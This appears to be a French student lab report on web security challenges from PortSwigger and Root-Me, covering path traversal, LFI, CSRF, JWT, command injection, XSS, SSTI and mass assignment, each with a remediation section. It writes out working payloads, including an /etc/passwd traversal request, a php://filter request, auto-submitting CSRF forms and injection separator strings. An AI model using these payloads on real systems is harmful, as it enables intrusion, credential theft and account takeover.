# TP Sécurité Web — hallenges

**Membres du groupe :** GUEPPOIS Karen· MOUKOKO NDONGO Victoire Dane

---

## Partie 2 — Challenges

---

### Challenge 1 — File Path Traversal : Null Byte Bypass

**URL :** https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

#### Comment on a trouvé la vulnérabilité

En ouvrant le lab, on remarque que les images produit se chargent via un paramètre `filename` dans l'URL. On a activé l'intercept dans Burp pour capturer la requête :

```
GET /image?filename=53.jpg HTTP/2
```

On a envoyé ça dans le Repeater et essayé de sortir du dossier images en faisant une traversée classique avec `../../../etc/passwd` — le serveur refuse parce qu'il vérifie que le fichier demandé se termine par une extension image.

L'astuce : le **null byte** (`%00`). En C et dans beaucoup d'implémentations, ce caractère marque la fin d'une chaîne. Donc si on envoie `../../../etc/passwd%00.jpg`, le serveur lit `.jpg` à la fin et valide, mais quand il ouvre réellement le fichier, le système s'arrête au `%00` et ouvre `/etc/passwd`.

#### Payload

```
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
Host: <lab-id>.web-security-academy.net
```

La réponse contient tout le fichier `/etc/passwd` avec la liste des utilisateurs du système.

#### Screenshot
<img width="959" height="683" alt="c1" src="https://github.com/user-attachments/assets/3a64f92a-a82a-451f-9105-e255386d0d20" />


#### Comment corriger ça

La bonne pratique c'est de ne jamais laisser l'utilisateur choisir un chemin de fichier directement. À la place, on peut utiliser une map statique côté serveur (id → nom de fichier) et construire le chemin en interne. Si on doit quand même accepter un nom de fichier, il faut résoudre le chemin absolu avec `realpath()` et vérifier qu'il reste bien dans le dossier autorisé. Tout caractère suspect (`../`, `%00`, `%2e%2e`) doit être bloqué dès l'entrée.

**Référence :** https://portswigger.net/web-security/file-path-traversal

---

### Challenge 2 — PHP Filters (LFI)

**URL :** https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters

#### Comment on a trouvé la vulnérabilité

En arrivant sur le challenge, on voit que les pages se chargent via un paramètre `?inc=` dans l'URL (`?inc=accueil.php`, `?inc=login.php`). C'est typiquement le genre de paramètre vulnérable à une inclusion de fichier local.

Si on essaie d'inclure directement un fichier PHP, le serveur l'exécute et on ne voit pas son contenu. Le wrapper `php://filter` de PHP permet de contourner ça en lisant le fichier encodé en base64 avant exécution. On a tenté avec `resource=login.php` mais nginx bloque les `.php`. En encodant le point en `%2e`, on contourne ce filtre.

On a lu `login.php` → son code source montre qu'il inclut `config.php`. On a lu `config.php` de la même façon → credentials en clair.

Toutes les requêtes ont été faites dans Burp Repeater, et le décodage base64 dans le terminal.

#### Payload

```
GET /web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config%2ephp HTTP/1.1
Host: challenge01.root-me.org
```

Décodage dans le terminal :

```bash
echo "PD9waHAKJHVzZXJuYW1lPSJhZG1pbiI7CiRwYXNzd29yZD0iREFQdDlEMm1reTBBUEFGIjsK" | base64 -d
```

Résultat :

```php
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
```

#### Screenshots

Burp Repeater avec la réponse base64 :

<img width="959" height="665" alt="s3" src="https://github.com/user-attachments/assets/c71457e4-7dfc-45b6-a11c-ab2baf9e4066" />


Décodage dans le terminal :

<img width="553" height="439" alt="s4" src="https://github.com/user-attachments/assets/2fb7c39f-c4a4-490a-aef6-9ee291e97e64" />


Page après connexion avec les credentials trouvés :

<img width="359" height="215" alt="s7" src="https://github.com/user-attachments/assets/cfc2aad6-430c-4ada-b5b5-163f0482c827" />
<img width="1216" height="622" alt="s5" src="https://github.com/user-attachments/assets/e5523695-6cb4-48ee-9a40-e444560aa72a" />


#### Comment corriger ça

Il ne faut jamais passer une entrée utilisateur directement dans `include()`. La solution propre c'est une liste blanche de pages autorisées :

```php
$pages = ['home' => 'accueil.php', 'login' => 'login.php'];
$file = $pages[$_GET['inc']] ?? 'accueil.php';
include($file);
```

Côté configuration PHP, désactiver `allow_url_include` dans `php.ini`. Et ne jamais stocker des mots de passe en clair dans des fichiers — utiliser des variables d'environnement ou un gestionnaire de secrets. Enfin, couper les messages d'erreur en production (`display_errors = Off`) car notre erreur `Warning: include(...)` nous a donné le chemin absolu du serveur.

**Référence :** https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

---

### Challenge 4 — CSRF : Token non lié à la session

**URL :** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

#### Comment on a trouvé la vulnérabilité

Le lab met à disposition deux comptes : `wiener/peter` et `carlos/montoya`. On s'est connecté en wiener et on a récupéré le token CSRF de la page "My account" sans soumettre le formulaire — le token reste donc valide côté serveur.

La vulnérabilité : ce token est valide pour n'importe quelle session, pas uniquement celle de wiener. Du coup, si on forge un formulaire CSRF avec ce token et qu'on le fait soumettre par la victime (via le bouton "Deliver to victim" de l'exploit server intégré au lab), le serveur l'accepte.

#### Payload

```html
<html>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil.com" />
      <input type="hidden" name="csrf" value="REVNkbUeQx8A4RABe96zEvTbfzI5MgSb" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

#### Screenshot

<img width="1132" height="299" alt="S9" src="https://github.com/user-attachments/assets/3506f05e-b29a-4c34-898e-67547d62ec57" />


#### Comment corriger ça

Le token CSRF doit absolument être lié à la session côté serveur. À chaque requête POST sensible, le back-end doit vérifier que le token reçu correspond bien au token associé à la session active. Les tokens doivent aussi être à usage unique — invalidés dès qu'ils ont été utilisés une fois.

**Référence :** https://portswigger.net/web-security/csrf/bypassing-token-validation

---

### Challenge 5 — CSRF : Validation du Referer dépendante de sa présence

**URL :** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

#### Comment on a trouvé la vulnérabilité

En testant dans Burp Repeater, on a modifié le header `Referer` de la requête POST pour mettre un domaine externe → le serveur répond `400 "Invalid referer header"`. Jusque là, la protection semble fonctionner.

Mais en supprimant complètement le header `Referer`, le serveur répond normalement sans le bloquer. Il ne vérifie le Referer que s'il est présent — s'il est absent, il laisse passer. Il suffit alors d'ajouter une balise meta sur notre page malveillante pour que le navigateur ne transmette pas ce header.

#### Payload

```html
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil.com" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

#### Screenshot

<img width="1132" height="299" alt="s10" src="https://github.com/user-attachments/assets/c3f865cf-9897-4aaa-b0e3-70d3de61a83e" />


#### Comment corriger ça

Ne pas baser une protection CSRF uniquement sur le Referer — c'est un header trop facilement contournable ou absent. Si on veut quand même vérifier l'origine de la requête, mieux vaut utiliser le header `Origin` qui ne peut pas être supprimé par `Referrer-Policy`. Dans tous les cas, la vraie protection reste un token CSRF lié à la session, couplé à `SameSite=Strict` sur les cookies.

**Référence :** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses

---

https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque
On essaye d’accéder à la page admin

<img alt="image" src="https://github.com/user-attachments/assets/bfd80519-c69c-46c3-b2d5-1f231967786e" />
Dans le code source on obtient les identifiants admin
<img alt="image" src="https://github.com/user-attachments/assets/4fbf8357-af2f-4c26-88d3-b35b6192cdae" />
Quand on change l’url on est en GET alors on va intercept la requête vers le login et se mettre en POST
<img alt="image" src="https://github.com/user-attachments/assets/a16a09b4-a318-45e7-b3ab-486ba8ec203a" />
On obtient le token admin
<img alt="image" src="https://github.com/user-attachments/assets/6a45f3a0-58e4-4e0a-baff-9c2be924b03d" />
On ajoute le token dans l’entête.
<img alt="image" src="https://github.com/user-attachments/assets/e8a65631-3e89-48ae-b12b-5576209e18cd" />
<img alt="image" src="https://github.com/user-attachments/assets/2a0dc035-3b83-41f7-9e7b-5b8c283da992" />
Le token expire au bout de très peu de temps donc je réalise de nouveau la manip’ en repeater 
<img alt="image" src="https://github.com/user-attachments/assets/59ab048c-f2ce-49a5-85ab-425093e31267" />
<img alt="image" src="https://github.com/user-attachments/assets/d79bf593-c8ab-48e6-a48d-03d55ca7774e" />
Je consulte de nouveau le code source. Le token se met dans une blacklist et donc il va falloir trouver un moyen de contourner cela.
<img alt="image" src="https://github.com/user-attachments/assets/95fff0da-89b3-444b-b097-28b181df0b60" />
Sur https://developer.mozilla.org/fr/docs/Glossary/Base64 on apprend que “=” sert à compléter une valeur et ne représente rien pour les décodeurs de token. 
<img alt="image" src="https://github.com/user-attachments/assets/4aa77eef-1c61-4c7b-b2e8-5afd2a713180" />

Recommandations pour sécuriser cette vulnérabilité :
Il y avait différents problème dans ce challenge tels que : les identifiants admin écrits en clair dans le code (1), le fonctionnement de l’application accessible (2), la gestion du token (3).
(1)	C’est une erreur de conception, il est recommandé d’utiliser des variables d’environnements et de stocker les informations sensibles en dehors du code public comme par exemple un .env. Il est aussi préférable de hacher le mot de passe.
Source: https://cwe.mitre.org/data/definitions/798.html 
(2)	Il aurait fallut retirer le fichier python de répertoire public, restreindre son accès par le biais de privilège pour sécuriser la logique.
Source: https://cwe.mitre.org/data/definitions/200.html
(3)	Le code compare le token avec la valeur qu’il a lui-même enregistrée en base, en faisant confiance à l’utilisateur. Il aurait fallu le normaliser pour s'assurer qu'une seule version du jeton soit possible car sinon plusieurs versions d’une donnée binaire peuvent être crées.
Source: https://datatracker.ietf.org/doc/html/rfc4648#section-3.5
<img alt="image" src="https://github.com/user-attachments/assets/855d4f77-404f-4256-8214-cf4abb243279" />

---

https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre  
Commandes de bases essayées afin de voir ce qui passent mais qui ne passent pas:
127.0.0.1;pwd
127.0.0.1&&pwd
127.0.0.1||pwd
127.0.0.1&pwd
127.0.0.1|pwd
On essaye la suivante, le saut de ligne
<img alt="image" src="https://github.com/user-attachments/assets/bc183f34-0d2d-480a-b05c-81d471b8d60f" />
<img alt="image" src="https://github.com/user-attachments/assets/c9265286-1445-4412-9fe0-03320a2b9bc2" />
<img alt="image" src="https://github.com/user-attachments/assets/4db9b64e-b914-410f-b261-16251ea6d1f0" />

On sait donc que le serveur est vulnérable au saut de ligne avec encodage url mais il ne m’a pas renvoyé le répertoire courant. On va passer au curl
<img alt="image" src="https://github.com/user-attachments/assets/bd1af97e-36f8-4789-968b-6314c05709da" />
Une fois le fichier lu, on sait que le mot de passe se trouve dans .passwd
<img alt="image" src="https://github.com/user-attachments/assets/d05bf9a2-fcfe-4fd3-8142-7690629c8400" />
On modifie la requête en remplaçant le fichier index.php par .passwd
<img alt="image" src="https://github.com/user-attachments/assets/40a5c3cd-fac5-4942-97ca-8778e4e5986d" />
On obtient le mot de passe.
<img alt="image" src="https://github.com/user-attachments/assets/9f98bfe8-0430-4d4c-899b-f2ecf076e579" />
Recommandations pour sécuriser cette vulnérabilité :
Il y avait différents problèmes dans ce challenge tels que : l’utilisation d'une blacklist faite soi-même qui était incomplète.


Le code filtrer les caractères en créant une “blacklist” , mais oublie le caractère de saut de ligne. Il est préférable d’utiliser une whitelist ou du moins des fonctions propres au langage pour être certain de ne rien oublier et de vérifier que c’est bien et uniquement une adresse ip.
<img alt="image" src="https://github.com/user-attachments/assets/b7db2d61-7e6a-4d8c-9ea2-1f202591784d" />
Source : https://cwe.mitre.org/data/definitions/78.html
Source : https://cwe.mitre.org/data/definitions/150.html

---

https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2?lang=fr
On voit que les messages normaux sont retranscrits 
<img alt="image" src="https://github.com/user-attachments/assets/7bbcbc06-43e4-466b-beb0-f8871b8f2091" />
On trouve un status “invite” dans les cookie (à l’origine), on essaye de le modifié en admin pour voir s’il se passe quelque chose mais rien ne change.
<img alt="image" src="https://github.com/user-attachments/assets/6919bf76-9ff8-410a-9516-16ca570ccd03" />
On va essayer la première méthode de PAYLOADALLTHETHING pour récupérer des données. On remplace le localhost par notre propre serveur distant.
<img alt="image" src="https://github.com/user-attachments/assets/45ba05f9-8dd4-4a3b-b875-9a50d44b49d2" />
Une des voies principales pour l’intrusion, c’est les inputs donc j’ai tenté de le mettre dans les messages mais rien y fait
<img alt="image" src="https://github.com/user-attachments/assets/e09287c2-af19-4175-b0da-189d900330ec" />
On voit que le cookie status prend aussi la class du span donc on peut se placer dans le cookie et jouer sur la “fin de la class”.
<img alt="image" src="https://github.com/user-attachments/assets/51f1421a-92a2-4e54-8c72-a720d4ab2920" />
<img alt="image" src="https://github.com/user-attachments/assets/d2c3db56-27fc-4608-904e-cae08858131c" />
On va ajouter “> dans notre cookie pour fermer la class et sortir de la balise afin de pouvoir exécuter notre script.
<img alt="image" src="https://github.com/user-attachments/assets/b5626961-2b53-49aa-a550-dd6b7538d30c" />
On intercept l’envoi des cookies du bot sur notre serveur.
<img alt="image" src="https://github.com/user-attachments/assets/4c52967a-889a-402f-b41b-81f47b475d53" />
Il faut ajouter le nouveau cookie dans le storage (et sûrement modifié le status en admin)
<img alt="image" src="https://github.com/user-attachments/assets/6e2f9228-5db0-4101-9986-dc817dea9db6" />
Recommandations pour sécuriser cette vulnérabilité :
Il y avait quelques :
(1) Cookie de session accessible
ADMIN_COOKIE n’est pas protégé. Il faut activer le HttpOnly pour interdire sa lecture avec document.cookie. Il ne sera donc pas communiquer en cas d’utilisation de cette fonction
Source : https://cwe.mitre.org/data/definitions/1004.html

(2) Redirection externe
On peut rediriger, faire intéragir l’utilisateur vers des sites externes ce qui est une vulnérabilité, il faut mettre en place CSP afin de bien scoper l’application et son usage.

Source : https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html

---

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit
<img alt="image" src="https://github.com/user-attachments/assets/e6cfdef5-da28-45a5-a8c3-49ecf0ff4bf1" />
On voit que le premier produit est out of stock mais le reste des articles s’affichent bien
<img alt="image" src="https://github.com/user-attachments/assets/32261563-414d-4f84-83c8-8934b70dd98d" />
On utilise le polyglot pour obtenir des informations sur le serveur.
<img alt="image" src="https://github.com/user-attachments/assets/98e2d97a-9298-4329-8e28-987274cd39dc" />
<img alt="image" src="https://github.com/user-attachments/assets/b99a6c8e-e577-49a5-b58f-639d0ef2f444" />
<img alt="image" src="https://github.com/user-attachments/assets/f81b8cef-529b-4935-a791-2111b6d62c52" />
On découvre que cest une app en nodejs utilisant handlebars
<img alt="image" src="https://github.com/user-attachments/assets/6e71b685-96fa-4d23-8e93-848e79a3efd6" />
On récupère le payload associé
<img alt="image" src="https://github.com/user-attachments/assets/094e367d-a0b8-41b4-8109-a25ea6521bca" />
On observe que la commande liste tout ce qu’il y a dans le répertoire de manière récursive et donc on peut supprimer le fichier
<img alt="image" src="https://github.com/user-attachments/assets/b7b55018-1e65-4705-b08a-b00ac7084009" />
On change le ls par la commande pour supprimer un fichier (rm)
<img alt="image" src="https://github.com/user-attachments/assets/84020f0b-a5bb-475d-b307-5cab66617519" />
<img alt="image" src="https://github.com/user-attachments/assets/19152a88-b093-48c8-b30c-2db31dbef08f" />

Recommandations pour sécuriser cette vulnérabilité :
Du coup là la vulnérabilité se trouvait dans le template. 
(1) Caractères spéciaux dans la route /message
L'application accepte n'importe quel texte dans la requête message. Il faut forcer le serveur à ne traiter cette entrée que comme une chaîne de caractères et interdire l'usage de caractères spéciaux liés au template.
Source : https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html

(2) Créer des routes fixes
L’utilisateur est capable d’inscrire l’information qu’il souhaite dans le message. Il faut créer des comportements uniques et fixes afin de n’obtenir que les effets attendus.
Source : https://owasp.org/www-project-top-ten/2017/A1_2017-Injection

---

https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment
On s’inscrit et on voit le comportement de l’application
<img alt="image" src="https://github.com/user-attachments/assets/782f041b-67db-4f5e-8151-d9049ba1ee36" />
<img alt="image" src="https://github.com/user-attachments/assets/952f3f3b-8a7f-432a-be46-731ca2bab540" />
<img alt="image" src="https://github.com/user-attachments/assets/dbb6d160-d9ec-44f2-a59d-dc5b087d4b36" />
<img alt="image" src="https://github.com/user-attachments/assets/f354aa25-8dc2-4380-99bf-b888893f9a90" />
<img alt="image" src="https://github.com/user-attachments/assets/7434faa6-b084-44b3-8d06-1f89cd0cf1d9" />
On a obtenu deux indicateurs : “status” : “guest” et user is not admin
On récupère toutes les données obtenues dans le get user info.
On essaye de modifier la requête PUT api note par USER
<img alt="image" src="https://github.com/user-attachments/assets/b9669be2-0d55-4fe1-bedf-56b007d6a5de" />
On tente d’obtenir le flag pour voir si le changement a été bien pris en compte.
<img alt="image" src="https://github.com/user-attachments/assets/a37610b9-ed55-4a62-80ce-b12df0abd9c0" />
Recommandations pour sécuriser cette vulnérabilité :
La vulnérabilité se trouvait dans la sécurisation des méthodes http et du champ status.

(1) Restreindre les méthodes HTTP 
Dans le challenge j’ai pu changer une méthode get en put pour obtenir un accès administrateur. Il  faut configurer le serveur pour qu'il rejette toute méthode HTTP non explicitement définie pour une route donnée et qu'il n'accepte que les structures de données strictement liées à la fonction de la route.

Source : https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html

(2) Champ status accessible
La possibilité rendre un utilisateur admin via un simple json est une faille de conception. En ne précisant pas la valeur en readonly, n’importe qui peut la modifier ou même la voir.

Source : https://swagger.io/docs/specification/v3_0/data-models/data-types/

















































